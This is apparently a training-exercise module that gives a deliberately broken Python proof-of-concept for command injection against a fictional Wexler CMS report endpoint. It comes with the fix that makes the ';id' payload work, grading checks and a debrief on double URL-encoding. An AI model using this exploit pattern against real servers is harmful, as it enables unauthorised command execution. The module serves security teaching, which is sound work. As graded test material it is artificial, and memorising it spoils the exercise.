"""salvage defect class 5: the payload arrives, mangled.

Encoding is where working exploits go to die, and the failure is unusually
hard to see because everything succeeds: the request is well formed, the
server accepts it, the response is a 200, and the injected command was
delivered as literal text instead of as a command.

The tell is that the base value arrives and the injection does not.
"""

from __future__ import annotations

from ...model import SalvageBody, Scenario
from ...targets._hits import Requirement

BROKEN = r'''#!/usr/bin/env python3
# Wexler CMS 2.1 - report generator argument injection
import urllib.parse
import urllib.request
import urllib.error

TARGET = "{{URL}}"
INJECT = "report;id"

def main():
    # be safe and encode the payload before sending it
    payload = urllib.parse.quote(INJECT)
    data = urllib.parse.urlencode({"cmd": payload, "fmt": "pdf"}).encode()
    req = urllib.request.Request(TARGET + "/admin/report", data)
    try:
        body = urllib.request.urlopen(req).read().decode()
    except urllib.error.HTTPError as e:
        body = e.read().decode()
    print("[*] sent: " + payload)
    print("[*] response: " + body)
    print("[+] landed" if "CRUX-LANDED" in body else "[-] no")

if __name__ == "__main__":
    main()
'''

SOLUTION = BROKEN.replace('    payload = urllib.parse.quote(INJECT)',
                          '    payload = INJECT')

SCENARIOS = [
    Scenario(
        id='salvage-encoding', track='salvage', tier='verified', order=50,
        title='200 OK, and the command ran as text',
        waypoint='webatk-cmdi', hone=('python', 'curl'),
        source='PEN-200 Playbook/04 - Phase 4 - Initial Foothold (Web).md',
        body=SalvageBody(
            brief='The report generator on Wexler CMS 2.1 splices its `cmd` '
                  'parameter into a shell command. This proof-of-concept '
                  'reaches the right endpoint and gets a clean response, and '
                  'nothing is injected.',
            filename='wexler_report.py',
            defects=('payload encoded once by hand and again by urlencode',),
            route='/admin/report',
            reject_code=200,
            reject_message='report queued',
            broken=BROKEN, solution=SOLUTION,
            requirements=(
                Requirement('the report endpoint', 'route', '/admin/report',
                            hint='nothing arrived at /admin/report'),
                Requirement('the base value', 'form', 'report', key='cmd',
                            hint='the cmd parameter did not carry the value '
                                 'at all'),
                Requirement('the injection, intact', 'form', ';id', key='cmd',
                            hint='the base value arrived but the injection '
                                 'did not survive: the server decoded once '
                                 'and got back your encoding, not your '
                                 'semicolon'),
            ),
            debrief='`quote()` then `urlencode()` is **encoding twice**. The '
                    'server decodes once, so `%3B` comes back out as text '
                    'rather than as a semicolon, and the injection is '
                    'delivered as part of the filename. Nothing errors, which '
                    'is what makes this expensive. **When a payload arrives '
                    'but does nothing, compare what you sent with what the '
                    'parameter should look like after one decode** rather '
                    'than adding more escaping. The graded feedback here is '
                    'the shape of the bug: the base value arrived, the '
                    'metacharacter did not.',
        ),
    ),
]
